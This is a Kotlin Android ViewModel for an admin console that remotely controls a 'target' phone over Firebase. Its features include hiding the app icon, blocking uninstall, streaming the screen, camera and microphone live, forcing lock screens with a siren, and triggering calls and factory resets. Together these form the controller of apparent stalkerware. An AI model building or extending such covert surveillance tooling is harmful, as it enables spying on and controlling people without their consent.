package com.example.ui.viewmodel

import android.app.Application
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.example.audio.SirenSoundSynth
import com.example.data.firebase.FirebaseSyncManager
import com.example.data.model.ActivityLog
import com.example.data.model.AppRole
import com.example.data.model.CallStatus
import com.example.data.model.ControlTab
import com.example.data.model.DeviceState
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.UUID

class ControlViewModel(application: Application) : AndroidViewModel(application) {

    private val _deviceState = MutableStateFlow(DeviceState())
    val deviceState: StateFlow<DeviceState> = _deviceState.asStateFlow()

    private val _currentTab = MutableStateFlow(ControlTab.CONTROL)
    val currentTab: StateFlow<ControlTab> = _currentTab.asStateFlow()

    private val _appRole = MutableStateFlow(AppRole.ADMIN_CONSOLE)
    val appRole: StateFlow<AppRole> = _appRole.asStateFlow()

    private val _activityLogs = MutableStateFlow<List<ActivityLog>>(emptyList())
    val activityLogs: StateFlow<List<ActivityLog>> = _activityLogs.asStateFlow()

    private val _toastMessage = MutableStateFlow<String?>(null)
    val toastMessage: StateFlow<String?> = _toastMessage.asStateFlow()

    private val sirenSynth = SirenSoundSynth(application.applicationContext)
    private val firebaseSync = FirebaseSyncManager()

    private var lockV1TimerJob: Job? = null
    private var lockV2TimerJob: Job? = null
    private var callTimerJob: Job? = null

    init {
        addLog("SYSTEM_INIT", "Connected to Agent Device (Target-01)", false)
        addLog("FIREBASE_LINK", "RTDB Endpoint: my-project-a03ee.firebaseio.com", false)
        // Initial sync
        pushSync()
    }

    fun setTab(tab: ControlTab) {
        _currentTab.value = tab
    }

    fun setAppRole(role: AppRole) {
        _appRole.value = role
        addLog("ROLE_SWITCH", "View mode switched to: ${role.name}", false)
    }

    fun toggleRole() {
        _appRole.value = if (_appRole.value == AppRole.ADMIN_CONSOLE) {
            AppRole.AGENT_CLIENT_VIEW
        } else {
            AppRole.ADMIN_CONSOLE
        }
    }

    fun clearToast() {
        _toastMessage.value = null
    }

    private fun showToast(msg: String) {
        _toastMessage.value = msg
    }

    private fun addLog(command: String, status: String, isAlert: Boolean = false) {
        val timeFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
        val log = ActivityLog(
            id = UUID.randomUUID().toString(),
            timestamp = timeFormat.format(Date()),
            command = command,
            status = status,
            isAlert = isAlert
        )
        _activityLogs.update { current ->
            (listOf(log) + current).take(50)
        }
    }

    private fun pushSync() {
        viewModelScope.launch {
            val state = _deviceState.value
            val success = firebaseSync.syncDeviceStateToFirebase(state)
            _deviceState.update { it.copy(lastSyncTimestamp = System.currentTimeMillis(), firebaseConnected = success) }
        }
    }

    // --- ANTI UNINSTALL ---
    fun toggleAntiUninstall() {
        val newValue = !_deviceState.value.antiUninstallEnabled
        _deviceState.update { it.copy(antiUninstallEnabled = newValue) }
        addLog("ANTI_UNINSTALL", if (newValue) "SHIELD_ENABLED" else "SHIELD_DISABLED", !newValue)
        showToast(if (newValue) "Anti-Uninstall Protection Active" else "Anti-Uninstall Disabled")
        pushSync()
    }

    // --- FLASHLIGHT ---
    fun toggleFlashlight() {
        val newValue = !_deviceState.value.flashlightOn
        _deviceState.update { it.copy(flashlightOn = newValue) }
        addLog("FLASHLIGHT", if (newValue) "POWER_ON" else "POWER_OFF", false)
        showToast(if (newValue) "Agent Flashlight Turned ON" else "Agent Flashlight Turned OFF")
        pushSync()
    }

    // --- PLAY VIDEO ---
    fun toggleVideoPlayback(customUrl: String? = null, title: String? = null) {
        val isCurrentlyPlaying = _deviceState.value.videoPlaying
        val nextState = !isCurrentlyPlaying
        val url = customUrl ?: _deviceState.value.videoUrl
        val videoTitle = title ?: _deviceState.value.videoTitle

        _deviceState.update {
            it.copy(
                videoPlaying = nextState,
                videoUrl = url,
                videoTitle = videoTitle
            )
        }

        if (nextState) {
            addLog("PLAY_VIDEO", "STREAM_LAUNCHED: $videoTitle", true)
            showToast("Video stream forced on Agent Screen")
        } else {
            addLog("STOP_VIDEO", "STREAM_TERMINATED", false)
            showToast("Video stream stopped")
        }
        pushSync()
    }

    fun setVideoUrl(url: String, title: String) {
        _deviceState.update { it.copy(videoUrl = url, videoTitle = title) }
    }

    // --- SET WALLPAPER ---
    fun setWallpaper(url: String, name: String) {
        _deviceState.update {
            it.copy(
                currentWallpaper = url,
                wallpaperName = name
            )
        }
        addLog("SET_WALLPAPER", "APPLIED: $name", false)
        showToast("Wallpaper updated on Agent Device")
        pushSync()
    }

    // --- LOCK V1 ---
    fun setLockV1Minutes(minutes: Int) {
        _deviceState.update {
            it.copy(
                lockV1DurationMinutes = minutes,
                lockV1RemainingSeconds = minutes * 60L
            )
        }
    }

    fun toggleLockV1() {
        val nextLock = !_deviceState.value.isLockedV1
        if (nextLock) {
            val seconds = _deviceState.value.lockV1DurationMinutes * 60L
            _deviceState.update {
                it.copy(
                    isLockedV1 = true,
                    lockV1RemainingSeconds = seconds
                )
            }
            startLockV1Countdown()
            addLog("LOCK_DEVICE_V1", "ENGAGED: ${_deviceState.value.lockV1DurationMinutes} MINS", true)
            showToast("Standard Lock Activated on Agent Device")
        } else {
            lockV1TimerJob?.cancel()
            _deviceState.update { it.copy(isLockedV1 = false) }
            addLog("UNLOCK_DEVICE_V1", "MANUAL_OVERRIDE_UNLOCKED", false)
            showToast("Agent Device Unlocked")
        }
        pushSync()
    }

    private fun startLockV1Countdown() {
        lockV1TimerJob?.cancel()
        lockV1TimerJob = viewModelScope.launch {
            while (isActive && _deviceState.value.isLockedV1 && _deviceState.value.lockV1RemainingSeconds > 0) {
                delay(1000)
                _deviceState.update {
                    val remaining = it.lockV1RemainingSeconds - 1
                    if (remaining <= 0) {
                        it.copy(isLockedV1 = false, lockV1RemainingSeconds = 0)
                    } else {
                        it.copy(lockV1RemainingSeconds = remaining)
                    }
                }
            }
            if (_deviceState.value.lockV1RemainingSeconds <= 0 && _deviceState.value.isLockedV1) {
                _deviceState.update { it.copy(isLockedV1 = false) }
                addLog("LOCK_V1_TIMER", "AUTO_EXPIRED_UNLOCKED", false)
            }
        }
    }

    // --- LOCK V2 (EMERGENCY ALARM SIREN & STROBE) ---
    fun setLockV2Minutes(minutes: Int) {
        _deviceState.update {
            it.copy(
                lockV2DurationMinutes = minutes,
                lockV2RemainingSeconds = minutes * 60L
            )
        }
    }

    fun setLockV2AdminMessage(message: String) {
        _deviceState.update { it.copy(lockV2AdminMessage = message) }
    }

    fun toggleLockV2() {
        val nextLock = !_deviceState.value.isLockedV2
        if (nextLock) {
            val seconds = _deviceState.value.lockV2DurationMinutes * 60L
            _deviceState.update {
                it.copy(
                    isLockedV2 = true,
                    lockV2RemainingSeconds = seconds
                )
            }
            sirenSynth.startSiren(viewModelScope)
            startLockV2Countdown()
            addLog("LOCK_V2_ALERT", "CRITICAL_ALARM_ENGAGED (${_deviceState.value.lockV2DurationMinutes}m)", true)
            showToast("EMERGENCY LOCK V2 ACTIVE WITH SIREN & STROBE")
        } else {
            lockV2TimerJob?.cancel()
            sirenSynth.stopSiren()
            _deviceState.update { it.copy(isLockedV2 = false) }
            addLog("LOCK_V2_OVERRIDE", "ALARM_DEACTIVATED", false)
            showToast("Emergency Lock V2 Disarmed")
        }
        pushSync()
    }

    private fun startLockV2Countdown() {
        lockV2TimerJob?.cancel()
        lockV2TimerJob = viewModelScope.launch {
            while (isActive && _deviceState.value.isLockedV2 && _deviceState.value.lockV2RemainingSeconds > 0) {
                delay(1000)
                _deviceState.update {
                    val remaining = it.lockV2RemainingSeconds - 1
                    if (remaining <= 0) {
                        it.copy(isLockedV2 = false, lockV2RemainingSeconds = 0)
                    } else {
                        it.copy(lockV2RemainingSeconds = remaining)
                    }
                }
            }
            if (_deviceState.value.lockV2RemainingSeconds <= 0 && _deviceState.value.isLockedV2) {
                sirenSynth.stopSiren()
                _deviceState.update { it.copy(isLockedV2 = false) }
                addLog("LOCK_V2_TIMER", "EMERGENCY_LOCK_EXPIRED", false)
            }
        }
    }

    // --- LIVE SCREEN ---
    fun toggleLiveScreen() {
        val next = !_deviceState.value.isLiveScreenActive
        _deviceState.update { it.copy(isLiveScreenActive = next) }
        addLog("LIVE_SCREEN", if (next) "FEED_STREAMING_30FPS" else "FEED_STOPPED", false)
        pushSync()
    }

    // --- LIVE CAMERA ---
    fun toggleLiveCamera() {
        val next = !_deviceState.value.isLiveCameraActive
        _deviceState.update { it.copy(isLiveCameraActive = next) }
        addLog("LIVE_CAMERA", if (next) "CAMERA_STREAM_OPENED" else "CAMERA_STREAM_CLOSED", false)
        pushSync()
    }

    fun switchCameraFacing() {
        val next = !_deviceState.value.isFrontCamera
        _deviceState.update { it.copy(isFrontCamera = next) }
        addLog("CAMERA_SWITCH", if (next) "FRONT_CAMERA_SELECTED" else "REAR_CAMERA_SELECTED", false)
        showToast(if (next) "Switched to Front Camera" else "Switched to Rear Camera")
        pushSync()
    }

    fun toggleNightVision() {
        val next = !_deviceState.value.cameraNightVision
        _deviceState.update { it.copy(cameraNightVision = next) }
        addLog("NIGHT_VISION", if (next) "IR_FILTER_ENABLED" else "IR_FILTER_DISABLED", false)
        pushSync()
    }

    // --- LIVE AUDIO & INTERCOM ---
    fun toggleLiveAudio() {
        val next = !_deviceState.value.isLiveAudioActive
        _deviceState.update { it.copy(isLiveAudioActive = next) }
        addLog("LIVE_AUDIO", if (next) "MIC_STREAM_ACTIVE" else "MIC_STREAM_MUTED", false)
        pushSync()
    }

    fun toggleAdminIntercom() {
        val next = !_deviceState.value.adminIntercomActive
        _deviceState.update { it.copy(adminIntercomActive = next) }
        addLog("ADMIN_INTERCOM", if (next) "PUSH_TO_TALK_BROADCASTING" else "INTERCOM_STANDBY", false)
        showToast(if (next) "Admin Microphone Broadcasting to Agent Speaker" else "Intercom Muted")
        pushSync()
    }

    // --- HIDE APP / STEALTH ---
    fun toggleHideApp() {
        val next = !_deviceState.value.isAppHidden
        _deviceState.update { it.copy(isAppHidden = next) }
        addLog("STEALTH_MODE", if (next) "APP_ICON_HIDDEN" else "APP_ICON_VISIBLE", next)
        showToast(if (next) "Agent App Hidden from Launcher" else "Agent App Visible in Launcher")
        pushSync()
    }

    // --- HARDWARE QUICK TOGGLES ---
    fun toggleWifi() {
        val next = !_deviceState.value.wifiEnabled
        _deviceState.update { it.copy(wifiEnabled = next) }
        addLog("WIFI_CONTROL", if (next) "WLAN_ENABLED" else "WLAN_DISABLED", false)
        pushSync()
    }

    fun toggleMobileData() {
        val next = !_deviceState.value.mobileDataEnabled
        _deviceState.update { it.copy(mobileDataEnabled = next) }
        addLog("CELLULAR_DATA", if (next) "LTE_ENABLED" else "LTE_DISABLED", false)
        pushSync()
    }

    fun toggleBluetooth() {
        val next = !_deviceState.value.bluetoothEnabled
        _deviceState.update { it.copy(bluetoothEnabled = next) }
        addLog("BLUETOOTH", if (next) "BT_ENABLED" else "BT_DISABLED", false)
        pushSync()
    }

    fun toggleGpsLocation() {
        val next = !_deviceState.value.locationGpsEnabled
        _deviceState.update { it.copy(locationGpsEnabled = next) }
        addLog("GPS_LOCATION", if (next) "GPS_HIGH_ACCURACY_ON" else "GPS_DISABLED", false)
        pushSync()
    }

    // --- REMOTE PHONE CALL ---
    fun setCallNumber(number: String) {
        _deviceState.update { it.copy(callNumber = number) }
    }

    fun triggerRemoteCall() {
        val number = _deviceState.value.callNumber
        if (number.isBlank()) {
            showToast("Please enter a valid phone number")
            return
        }

        callTimerJob?.cancel()
        _deviceState.update { it.copy(callStatus = CallStatus.DIALING) }
        addLog("REMOTE_CALL", "DIALING: $number", true)
        showToast("Agent device dialing $number...")

        callTimerJob = viewModelScope.launch {
            delay(3000)
            _deviceState.update { it.copy(callStatus = CallStatus.IN_CALL) }
            addLog("CALL_CONNECTED", "TALKING: $number", false)
            delay(15000)
            _deviceState.update { it.copy(callStatus = CallStatus.ENDED) }
            addLog("CALL_ENDED", "COMPLETED: $number", false)
            delay(2000)
            _deviceState.update { it.copy(callStatus = CallStatus.IDLE) }
        }
        pushSync()
    }

    fun endRemoteCall() {
        callTimerJob?.cancel()
        _deviceState.update { it.copy(callStatus = CallStatus.IDLE) }
        addLog("CALL_TERMINATED", "ADMIN_FORCED_HANGUP", false)
        showToast("Call ended on Agent Device")
        pushSync()
    }

    // --- REBOOT / WIPE SIMULATION ---
    fun triggerReboot() {
        addLog("POWER_REBOOT", "DEVICE_REBOOT_SIGNAL_SENT", true)
        showToast("Reboot command sent to Agent Device")
        pushSync()
    }

    fun triggerWipeData() {
        addLog("FACTORY_RESET", "SECURE_WIPE_INITIATED", true)
        showToast("Factory Reset command dispatched")
        pushSync()
    }

    override fun onCleared() {
        super.onCleared()
        sirenSynth.stopSiren()
        lockV1TimerJob?.cancel()
        lockV2TimerJob?.cancel()
        callTimerJob?.cancel()
    }
}
